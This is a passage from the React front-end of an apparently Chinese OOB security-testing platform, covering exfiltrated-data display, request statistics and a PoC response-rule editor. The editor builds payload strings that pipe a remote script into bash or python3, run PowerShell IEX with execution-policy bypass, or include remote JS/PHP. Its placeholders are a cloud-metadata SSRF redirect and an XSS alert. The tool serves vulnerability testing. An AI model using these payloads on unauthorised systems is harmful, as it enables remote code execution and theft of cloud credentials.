                                    <h4 className="text-sm font-bold text-red-400 flex items-center gap-2">
                                      <Zap className="w-4 h-4" />
                                      外带数据 - 攻击验证成功
                                      {record.exfil_type && (
                                        <span className="text-xs bg-red-500/20 px-2 py-0.5 rounded font-normal">
                                          {record.exfil_type}
                                        </span>
                                      )}
                                      <span className="text-xs font-normal text-red-400/60">
                                        {decoded.length} 字符 / {lines.length} 行
                                      </span>
                                    </h4>
                                    <div className="flex items-center gap-2">
                                      <button
                                        onClick={(e) => {
                                          e.stopPropagation()
                                          copyToClipboard(decoded).then(ok =>
                                            toast[ok ? 'success' : 'error'](ok ? '已复制外带数据' : '复制失败')
                                          )
                                        }}
                                        className="px-2 py-0.5 text-xs rounded bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-colors flex items-center gap-1"
                                      >
                                        <Copy className="w-3 h-3" />
                                        复制
                                      </button>
                                      {isLong && (
                                        <button
                                          onClick={(e) => {
                                            e.stopPropagation()
                                            setExpandedExfil(isExpanded ? null : record.id)
                                          }}
                                          className="px-2 py-0.5 text-xs rounded bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-colors flex items-center gap-1"
                                        >
                                          {isExpanded ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
                                          {isExpanded ? '收起' : '展开全部'}
                                        </button>
                                      )}
                                    </div>
                                  </div>
                                  <pre className={cn(
                                    "bg-black/30 rounded p-3 font-mono text-xs text-red-300 overflow-auto whitespace-pre-wrap break-all max-w-full transition-all",
                                    isExpanded ? "max-h-[70vh]" : "max-h-32"
                                  )}>
                                    <HighlightText text={decoded} />
                                  </pre>
                                </div>
                              )
                            })()}

                            {/* 基本信息 */}
                            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                              <div
                                className={cn(
                                  "bg-theme-bg rounded-lg p-3",
                                  formatIp(record.client_ip) !== 'Unknown' && "cursor-pointer hover:bg-theme-bg/80 hover:ring-1 hover:ring-theme-primary/50 transition-all"
                                )}
                                onClick={(e) => {
                                  if (formatIp(record.client_ip) !== 'Unknown') {
                                    e.stopPropagation()
                                    navigate(`/tools/network?q=${encodeURIComponent(formatIp(record.client_ip))}`)
                                  }
                                }}
                                title={formatIp(record.client_ip) !== 'Unknown' ? '点击跳转网络工具查询' : undefined}
                              >
                                <div className="text-xs text-theme-muted mb-1">客户端 IP</div>
                                <div className="font-mono text-sm text-theme-text flex items-center gap-1">
                                  {formatIp(record.client_ip)}
                                  {formatIp(record.client_ip) !== 'Unknown' && (
                                    <ExternalLink className="w-3 h-3 opacity-50" />
                                  )}
                                </div>
                              </div>
                              <div className="bg-theme-bg rounded-lg p-3">
                                <div className="text-xs text-theme-muted mb-1">协议</div>
                                <div className="font-mono text-sm text-theme-text">{record.protocol}</div>
                              </div>
                              <div className="bg-theme-bg rounded-lg p-3">
                                <div className="text-xs text-theme-muted mb-1">请求时间</div>
                                <div className="font-mono text-sm text-theme-text">{new Date(record.timestamp).toLocaleString()}</div>
                              </div>
                              {record.poc_rule_name && (
                                <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-3">
                                  <div className="text-xs text-amber-400 mb-1">命中规则</div>
                                  <div className="font-mono text-sm text-amber-300">{record.poc_rule_name}</div>
                                </div>
                              )}
                            </div>

                            {/* 完整 URL */}
                            <div>
                              <h4 className="text-xs font-medium text-theme-muted mb-2 flex items-center gap-2">
                                <Link2 className="w-3.5 h-3.5" />
                                完整请求 URL
                              </h4>
                              <div className="bg-theme-bg rounded-lg p-3 font-mono text-xs break-all max-h-24 overflow-auto max-w-full">
                                <span className={cn(
                                  'font-bold mr-2',
                                  record.method === 'GET' && 'text-green-400',
                                  record.method === 'POST' && 'text-blue-400',
                                  record.method === 'PUT' && 'text-yellow-400',
                                  record.method === 'DELETE' && 'text-red-400'
                                )}>
                                  {record.method}
                                </span>
                                <HighlightText text={record.path || ''} className="text-theme-text" />
                                {record.query_string && (
                                  <HighlightText text={'?' + record.query_string} className="text-theme-primary" />
                                )}
                              </div>
                            </div>

                            {/* User-Agent */}
                            {record.user_agent && (
                              <div>
                                <h4 className="text-xs font-medium text-theme-muted mb-2 flex items-center gap-2">
                                  <Users className="w-3.5 h-3.5" />
                                  User-Agent
                                </h4>
                                <div className="bg-theme-bg rounded-lg p-3 font-mono text-xs text-theme-text break-all">
                                  <HighlightText text={record.user_agent || ''} />
                                </div>
                              </div>
                            )}

                            {/* Headers */}
                            {record.headers && Object.keys(record.headers).length > 0 && (
                              <div>
                                <h4 className="text-xs font-medium text-theme-muted mb-2 flex items-center gap-2">
                                  <FileCode className="w-3.5 h-3.5" />
                                  请求头 Headers ({Object.keys(record.headers).length})
                                </h4>
                                <div className="bg-theme-bg rounded-lg p-3 font-mono text-xs max-h-48 overflow-auto max-w-full">
                                  {Object.entries(record.headers).map(([key, value]) => (
                                    <div key={key} className="flex py-0.5 border-b border-theme-border/30 last:border-0">
                                      <HighlightText text={key + ':'} className="text-theme-primary min-w-[180px] font-medium" />
                                      <HighlightText text={value} className="text-theme-text break-all" />
                                    </div>
                                  ))}
                                </div>
                              </div>
                            )}

                            {/* Body */}
                            {record.body && (
                              <div>
                                <h4 className="text-xs font-medium text-theme-muted mb-2 flex items-center gap-2">
                                  <FileCode className="w-3.5 h-3.5" />
                                  请求体 Body ({record.body.length} bytes)
                                  <button
                                    onClick={async (e) => {
                                      e.stopPropagation()
                                      const ok = await copyToClipboard(record.body || '')
                                      toast[ok ? 'success' : 'error'](ok ? '已复制 Body' : '复制失败')
                                    }}
                                    className="ml-auto text-theme-primary hover:text-theme-primary/80 flex items-center gap-1"
                                  >
                                    <Copy className="w-3 h-3" />
                                    <span>复制</span>
                                  </button>
                                </h4>
                                <pre className="bg-theme-bg rounded-lg p-3 font-mono text-xs text-theme-text max-h-32 overflow-auto whitespace-pre-wrap break-all max-w-full">
                                  <HighlightText text={record.body || ''} />
                                </pre>
                              </div>
                            )}

                            {/* 原始请求 */}
                            {record.raw_request && (
                              <div>
                                <h4 className="text-xs font-medium text-theme-muted mb-2 flex items-center gap-2">
                                  <FileCode className="w-3.5 h-3.5" />
                                  原始请求 Raw Request
                                  <button
                                    onClick={async (e) => {
                                      e.stopPropagation()
                                      const ok = await copyToClipboard(record.raw_request || '')
                                      toast[ok ? 'success' : 'error'](ok ? '已复制原始请求' : '复制失败')
                                    }}
                                    className="ml-auto text-theme-primary hover:text-theme-primary/80 flex items-center gap-1"
                                  >
                                    <Copy className="w-3 h-3" />
                                    <span>复制</span>
                                  </button>
                                </h4>
                                <pre className="bg-black/50 rounded-lg p-3 font-mono text-xs text-green-400 max-h-32 overflow-auto whitespace-pre break-all max-w-full border border-green-500/20">
                                  <HighlightText text={record.raw_request || ''} />
                                </pre>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    ))
                  )}
                </div>
              ) : activeTab === 'stats' ? (
                // 统计分析
                <div className="space-y-6">
                  {stats ? (
                    <>
                      {/* 总数 */}
                      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-lg bg-theme-primary/20 flex items-center justify-center">
                              <Link2 className="w-5 h-5 text-theme-primary" />
                            </div>
                            <div>
                              <div className="text-2xl font-bold text-theme-text">{stats.total}</div>
                              <div className="text-xs text-theme-muted">总请求数</div>
                            </div>
                          </div>
                        </div>
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-lg bg-green-500/20 flex items-center justify-center">
                              <Users className="w-5 h-5 text-green-400" />
                            </div>
                            <div>
                              <div className="text-2xl font-bold text-theme-text">{stats.by_ip.length}</div>
                              <div className="text-xs text-theme-muted">独立 IP 数</div>
                            </div>
                          </div>
                        </div>
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center">
                              <FileCode className="w-5 h-5 text-blue-400" />
                            </div>
                            <div>
                              <div className="text-2xl font-bold text-theme-text">{stats.by_path.length}</div>
                              <div className="text-xs text-theme-muted">不同路径数</div>
                            </div>
                          </div>
                        </div>
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-lg bg-purple-500/20 flex items-center justify-center">
                              <Globe className="w-5 h-5 text-purple-400" />
                            </div>
                            <div>
                              <div className="text-2xl font-bold text-theme-text">{stats.by_user_agent.length}</div>
                              <div className="text-xs text-theme-muted">不同 UA 数</div>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* 详细统计 */}
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                        {/* 按 IP */}
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <h4 className="font-medium text-theme-text mb-3 flex items-center gap-2">
                            <Users className="w-4 h-4" />
                            按 IP 统计 (Top 10)
                          </h4>
                          <div className="space-y-2">
                            {stats.by_ip.map((item, idx) => (
                              <div key={idx} className="flex items-center justify-between">
                                <span className="font-mono text-sm text-theme-muted">{item.ip}</span>
                                <span className="text-theme-primary font-medium">{item.count}</span>
                              </div>
                            ))}
                            {stats.by_ip.length === 0 && (
                              <div className="text-center text-theme-muted text-sm py-4">暂无数据</div>
                            )}
                          </div>
                        </div>

                        {/* 按 Method */}
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <h4 className="font-medium text-theme-text mb-3 flex items-center gap-2">
                            <FileCode className="w-4 h-4" />
                            按请求方法统计
                          </h4>
                          <div className="space-y-2">
                            {stats.by_method.map((item, idx) => (
                              <div key={idx} className="flex items-center justify-between">
                                <span className={cn(
                                  'px-2 py-0.5 rounded text-xs font-mono',
                                  item.method === 'GET' && 'bg-green-500/20 text-green-400',
                                  item.method === 'POST' && 'bg-blue-500/20 text-blue-400',
                                  item.method === 'PUT' && 'bg-yellow-500/20 text-yellow-400',
                                  item.method === 'DELETE' && 'bg-red-500/20 text-red-400'
                                )}>
                                  {item.method}
                                </span>
                                <span className="text-theme-primary font-medium">{item.count}</span>
                              </div>
                            ))}
                            {stats.by_method.length === 0 && (
                              <div className="text-center text-theme-muted text-sm py-4">暂无数据</div>
                            )}
                          </div>
                        </div>

                        {/* 按 Path */}
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <h4 className="font-medium text-theme-text mb-3 flex items-center gap-2">
                            <Link2 className="w-4 h-4" />
                            按路径统计 (Top 10)
                          </h4>
                          <div className="space-y-2">
                            {stats.by_path.map((item, idx) => (
                              <div key={idx} className="flex items-center justify-between">
                                <span className="font-mono text-sm text-theme-muted truncate flex-1 mr-2">{item.path}</span>
                                <span className="text-theme-primary font-medium">{item.count}</span>
                              </div>
                            ))}
                            {stats.by_path.length === 0 && (
                              <div className="text-center text-theme-muted text-sm py-4">暂无数据</div>
                            )}
                          </div>
                        </div>

                        {/* 按 User-Agent */}
                        <div className="bg-theme-card border border-theme-border rounded-lg p-4">
                          <h4 className="font-medium text-theme-text mb-3 flex items-center gap-2">
                            <Globe className="w-4 h-4" />
                            按 User-Agent 统计 (Top 10)
                          </h4>
                          <div className="space-y-2">
                            {stats.by_user_agent.map((item, idx) => (
                              <div key={idx} className="flex items-center justify-between">
                                <span className="text-sm text-theme-muted truncate flex-1 mr-2" title={item.user_agent}>
                                  {item.user_agent.length > 50 ? item.user_agent.slice(0, 50) + '...' : item.user_agent}
                                </span>
                                <span className="text-theme-primary font-medium">{item.count}</span>
                              </div>
                            ))}
                            {stats.by_user_agent.length === 0 && (
                              <div className="text-center text-theme-muted text-sm py-4">暂无数据</div>
                            )}
                          </div>
                        </div>
                      </div>
                    </>
                  ) : (
                    <div className="flex items-center justify-center py-12">
                      <Loader2 className="w-6 h-6 animate-spin text-theme-primary" />
                    </div>
                  )}
                </div>
              ) : (
                // PoC 规则
                <div className="space-y-4">
                  {/* 操作栏 */}
                  <div className="flex items-center justify-between">
                    <h3 className="font-medium text-theme-text">PoC 响应规则</h3>
                    <button
                      onClick={() => {
                        const firstTemplateKey = Object.keys(pocTemplates)[0]
                        if (firstTemplateKey && pocTemplates[firstTemplateKey]) {
                          const tpl = pocTemplates[firstTemplateKey]
                          setPocForm({
                            name: tpl.name,
                            description: tpl.description || '',
                            status_code: tpl.status_code || 200,
                            content_type: tpl.content_type || 'text/html',
                            response_body: tpl.response_body || '',
                            redirect_url: tpl.redirect_url || '',
                            delay_ms: 0,
                            enable_variables: tpl.enable_variables || false,
                            filename: tpl.filename || '',
                          })
                        } else {
                          resetPocForm()
                        }
                        setEditingRule(null)
                        setShowPocForm(true)
                      }}
                      className="btn btn-primary btn-sm flex items-center gap-1"
                    >
                      <Plus className="w-4 h-4" />
                      新建规则
                    </button>
                  </div>

                  {/* 规则编辑表单 */}
                  {showPocForm && (
                    <div className="bg-theme-card border border-theme-border rounded-lg p-4 space-y-4">
                      <div className="flex items-center justify-between">
                        <h4 className="font-medium text-theme-text">
                          {editingRule ? '编辑规则' : '新建规则'}
                        </h4>
                        <button
                          onClick={() => {
                            setShowPocForm(false)
                            resetPocForm()
                          }}
                          className="text-theme-muted hover:text-theme-text"
                        >
                          <X className="w-4 h-4" />
                        </button>
                      </div>

                      {/* 模板选择（按分类分组） */}
                      <div>
                        <label className="text-sm text-theme-muted mb-1 block">选择模板（自动填充）</label>
                        <select
                          onChange={(e) => {
                            if (e.target.value) {
                              applyTemplate(e.target.value)
                            }
                          }}
                          className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                          defaultValue=""
                        >
                          <option value="" disabled>-- 切换模板 --</option>
                          {Object.entries(getTemplatesByCategory()).map(([cat, templates]) => (
                            <optgroup key={cat} label={CATEGORY_LABELS[cat] || cat}>
                              {templates.map(([key, tpl]) => (
                                <option key={key} value={key}>
                                  {tpl.name} - {tpl.description}
                                </option>
                              ))}
                            </optgroup>
                          ))}
                        </select>
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="text-sm text-theme-muted mb-1 block">规则名称 *</label>
                          <input
                            type="text"
                            value={pocForm.name}
                            onChange={(e) => setPocForm(p => ({ ...p, name: e.target.value }))}
                            placeholder="xss-test"
                            className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                          />
                          <p className="text-xs text-theme-muted mt-1">
                            URL: {getFullUrl(selectedToken?.url || '', `/p/${pocForm.name || 'name'}`)}
                          </p>
                        </div>
                        <div>
                          <label className="text-sm text-theme-muted mb-1 block">描述</label>
                          <input
                            type="text"
                            value={pocForm.description}
                            onChange={(e) => setPocForm(p => ({ ...p, description: e.target.value }))}
                            placeholder="XSS 测试"
                            className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                          />
                        </div>
                      </div>

                      {/* 文件名（脚本文件投递用） */}
                      <div>
                        <label className="text-sm text-theme-muted mb-1 block">文件名（可选，设置后响应带 Content-Disposition）</label>
                        <input
                          type="text"
                          value={pocForm.filename}
                          onChange={(e) => setPocForm(p => ({ ...p, filename: e.target.value }))}
                          placeholder="例: setup.sh / check.py / update.ps1"
                          className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded font-mono"
                        />
                        <p className="text-xs text-blue-400/70 mt-1">
                          {pocForm.filename?.endsWith('.sh') ? `Payload: curl -sL '…/p/${pocForm.name || 'name'}' | bash`
                            : pocForm.filename?.endsWith('.py') ? `Payload: curl -sL '…/p/${pocForm.name || 'name'}' | python3`
                            : pocForm.filename?.endsWith('.ps1') ? `Payload: powershell -ep bypass -c "IEX(IWR '…/p/${pocForm.name || 'name'}')"`
                            : pocForm.filename?.endsWith('.js') ? `Payload: <script src="…/p/${pocForm.name || 'name'}"></script>`
                            : pocForm.filename?.endsWith('.php') ? `Payload: <?php include('…/p/${pocForm.name || 'name'}'); ?>`
                            : `Payload: curl -sL '…/p/${pocForm.name || 'name'}'`}
                        </p>
                      </div>

                      <div className="grid grid-cols-3 gap-4">
                        <div>
                          <label className="text-sm text-theme-muted mb-1 block">状态码</label>
                          <select
                            value={pocForm.status_code}
                            onChange={(e) => setPocForm(p => ({ ...p, status_code: Number(e.target.value) }))}
                            className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                          >
                            <option value={200}>200 OK</option>
                            <option value={201}>201 Created</option>
                            <option value={301}>301 Redirect</option>
                            <option value={302}>302 Redirect</option>
                            <option value={400}>400 Bad Request</option>
                            <option value={500}>500 Error</option>
                          </select>
                        </div>
                        <div>
                          <label className="text-sm text-theme-muted mb-1 block">Content-Type</label>
                          <select
                            value={pocForm.content_type}
                            onChange={(e) => setPocForm(p => ({ ...p, content_type: e.target.value }))}
                            className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                          >
                            <option value="text/html">text/html</option>
                            <option value="text/plain">text/plain</option>
                            <option value="application/json">application/json</option>
                            <option value="application/xml">application/xml</option>
                            <option value="application/xml-dtd">application/xml-dtd</option>
                            <option value="text/javascript">text/javascript</option>
                            <option value="application/x-httpd-php">application/x-httpd-php</option>
                            <option value="application/x-sh">application/x-sh</option>
                            <option value="application/octet-stream">application/octet-stream</option>
                          </select>
                        </div>
                        <div>
                          <label className="text-sm text-theme-muted mb-1 block">延迟 (ms)</label>
                          <input
                            type="number"
                            value={pocForm.delay_ms}
                            onChange={(e) => setPocForm(p => ({ ...p, delay_ms: Number(e.target.value) }))}
                            min={0}
                            className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded"
                          />
                        </div>
                      </div>

                      <div>
                        <label className="text-sm text-theme-muted mb-1 block">重定向 URL（优先于响应体）</label>
                        <input
                          type="text"
                          value={pocForm.redirect_url}
                          onChange={(e) => setPocForm(p => ({ ...p, redirect_url: e.target.value }))}
                          placeholder="http://169.254.169.254/latest/meta-data/"
                          className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded font-mono"
                        />
                      </div>

                      <div>
                        <label className="text-sm text-theme-muted mb-1 block">响应体</label>
                        <textarea
                          value={pocForm.response_body}
                          onChange={(e) => setPocForm(p => ({ ...p, response_body: e.target.value }))}
                          placeholder="<script>alert(1)</script>"
                          rows={4}
                          className="w-full px-3 py-2 text-sm bg-theme-bg border border-theme-border rounded font-mono resize-none"
                        />
                      </div>

                      <div className="flex items-center gap-4">
                        <label className="flex items-center gap-2 text-sm text-theme-muted cursor-pointer">
                          <input
                            type="checkbox"
                            checked={pocForm.enable_variables}
                            onChange={(e) => setPocForm(p => ({ ...p, enable_variables: e.target.checked }))}
                            className="rounded"
                          />
                          启用变量替换
                        </label>
                        {pocForm.enable_variables && (
                          <span className="text-xs text-theme-muted">
                            支持: {'{{client_ip}}'}, {'{{timestamp}}'}, {'{{callback_url}}'}, {'{{param.xxx}}'}
                          </span>
                        )}
                      </div>

                      <div className="flex gap-2 justify-end">
                        <button
                          onClick={() => {
                            setShowPocForm(false)
                            resetPocForm()
                          }}
                          className="btn btn-secondary btn-sm"
                        >
                          取消
                        </button>
                        <button
                          onClick={savePocRule}
                          disabled={loading || !pocForm.name.trim()}
                          className="btn btn-primary btn-sm"
                        >
                          {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : '保存'}
                        </button>
                      </div>
                    </div>
                  )}

                  {/* 规则列表 */}
                  <div className="space-y-2">
                    {pocRules.length === 0 ? (
                      <div className="text-center py-8 text-theme-muted">
                        <Zap className="w-8 h-8 mx-auto mb-2 opacity-50" />
                        <p>暂无 PoC 规则</p>
                        <p className="text-xs mt-1">创建规则后，访问对应 URL 将返回自定义响应</p>
                      </div>
                    ) : (
                      pocRules.map((rule) => (
                        <div
                          key={rule.id}
                          className="bg-theme-card border border-theme-border rounded-lg p-3"
                        >
                          <div className="flex items-center justify-between mb-2">
                            <div className="flex items-center gap-2">
                              <span className={cn(
                                'px-2 py-0.5 rounded text-xs font-mono',
                                rule.redirect_url
                                  ? 'bg-yellow-500/20 text-yellow-400'
                                  : rule.filename
                                    ? 'bg-purple-500/20 text-purple-400'
                                    : 'bg-green-500/20 text-green-400'
                              )}>
                                {rule.redirect_url ? rule.status_code : rule.filename ? rule.filename : rule.content_type}
                              </span>
                              <span className="font-mono text-sm text-theme-text">{rule.name}</span>
                              {rule.description && (
                                <span className="text-xs text-theme-muted">- {rule.description}</span>
                              )}
                            </div>
                            <div className="flex items-center gap-2">
                              <span className="text-xs text-theme-muted">{rule.hit_count} 次命中</span>
                              <button
                                onClick={() => copyUrl(selectedToken!, rule.name)}
                                className={cn(
                                  'px-2 py-1 text-xs rounded flex items-center gap-1 transition-colors',
                                  copiedId === rule.name
                                    ? 'bg-green-500/20 text-green-400'
                                    : 'bg-theme-bg text-theme-muted hover:text-theme-primary hover:bg-theme-primary/10'
                                )}
                              >
                                {copiedId === rule.name ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                {copiedId === rule.name ? '已复制' : 'URL'}
                              </button>
                              <button
                                onClick={() => editPocRule(rule)}
                                className="p-1 text-theme-muted hover:text-theme-primary"
                                title="编辑"
                              >
                                <Edit2 className="w-3.5 h-3.5" />
                              </button>
                              <button
                                onClick={() => deletePocRule(rule.id)}
                                className="p-1 text-theme-muted hover:text-red-400"
                                title="删除"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          </div>
                          {/* Payload 一键复制 */}
                          <div 
                            className="text-xs font-mono bg-blue-500/10 border border-blue-500/25 rounded px-2.5 py-2 flex items-center justify-between group cursor-pointer hover:bg-blue-500/15 transition-colors"
                            onClick={() => copyPayloadUsage(rule)}
                            title="点击复制 Payload"
                          >
                            <div className="flex items-center gap-2 min-w-0">
                              <span className="text-blue-500 flex-shrink-0 font-semibold">$</span>
                              <span className="text-blue-300 truncate">{getUsageHint(rule)}</span>
                            </div>
                            <button className="ml-2 px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 transition-colors flex-shrink-0 flex items-center gap-1">
                              <Copy className="w-3 h-3" />
                              复制
                            </button>
                          </div>
                          {/* URL */}
                          <div 
                            className="text-xs text-theme-muted font-mono bg-theme-bg rounded px-2 py-1 flex items-center justify-between group cursor-pointer hover:bg-theme-bg/80 mt-1.5"
                            onClick={() => copyUrl(selectedToken!, rule.name)}
                            title="点击复制 URL"
                          >
                            <span className="truncate">{getFullUrl(selectedToken?.url || '', `/p/${rule.name}`)}</span>
                            <span className="ml-2 opacity-0 group-hover:opacity-100 transition-opacity text-theme-primary flex-shrink-0">
                              {copiedId === rule.name ? '✓' : '复制'}
                            </span>
                          </div>
                          {rule.redirect_url && (
                            <div className="mt-2 text-xs text-theme-muted">
                              重定向到: <span className="text-yellow-400">{rule.redirect_url}</span>
                            </div>
                          )}
                          {rule.response_body && !rule.redirect_url && (
                            <pre className="mt-2 text-xs text-theme-muted bg-theme-bg rounded px-2 py-1 max-h-20 overflow-auto whitespace-pre-wrap">
                              {rule.response_body.length > 200 
                                ? rule.response_body.slice(0, 200) + '...' 
                                : rule.response_body}
                            </pre>
                          )}
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}
            </div>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center text-theme-muted">
            <div className="text-center">
              <Radio className="w-12 h-12 mx-auto mb-3 opacity-50" />
              <p>选择或创建一个 Token 开始使用</p>
              <p className="text-sm mt-2">
                OOB (Out-of-Band) 探测用于检测 SSRF、XXE、RCE、盲注等漏洞
              </p>
            </div>
          </div>
        )}
      </div>

      {/* 续期确认对话框 */}
      {showRenewDialog && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
          <div className="bg-theme-card border border-theme-border rounded-lg p-6 w-[400px] shadow-xl">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 rounded-full bg-amber-500/20 flex items-center justify-center">
                <AlertCircle className="w-5 h-5 text-amber-400" />
              </div>
              <div>
                <h3 className="text-lg font-semibold text-theme-text">Token 已过期</h3>
                <p className="text-sm text-theme-muted">是否续期此 Token？</p>
              </div>
            </div>
            
            <div className="mb-4 p-3 bg-theme-bg rounded-lg">
              <div className="text-sm text-theme-muted mb-2">当前 Token</div>
              <code className="text-xs text-theme-primary font-mono">
                {selectedToken?.name || selectedToken?.token}
              </code>
              <div className="text-xs text-theme-muted mt-1">
                过期时间: {selectedToken?.expires_at 
                  ? new Date(selectedToken.expires_at).toLocaleString() 
                  : '未设置'}
              </div>
            </div>

            <div className="mb-4">
              <label className="block text-sm text-theme-muted mb-2">续期时长</label>
              <select
                value={renewHours}
                onChange={(e) => setRenewHours(Number(e.target.value))}
                className="w-full px-3 py-2 bg-theme-bg border border-theme-border rounded-lg text-theme-text"
              >
                <option value={1}>1 小时</option>
                <option value={6}>6 小时</option>
                <option value={12}>12 小时</option>
                <option value={24}>24 小时</option>
                <option value={72}>3 天</option>
                <option value={168}>7 天</option>
                <option value={0}>永不过期</option>
              </select>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setShowRenewDialog(false)}
                className="flex-1 btn btn-secondary"
                disabled={loading}
              >
                取消
              </button>
              <button
                onClick={renewToken}
                disabled={loading}
                className="flex-1 btn btn-primary flex items-center justify-center gap-2"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    续期中...
                  </>
                ) : (
                  <>
                    <RefreshCw className="w-4 h-4" />
                    确认续期
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
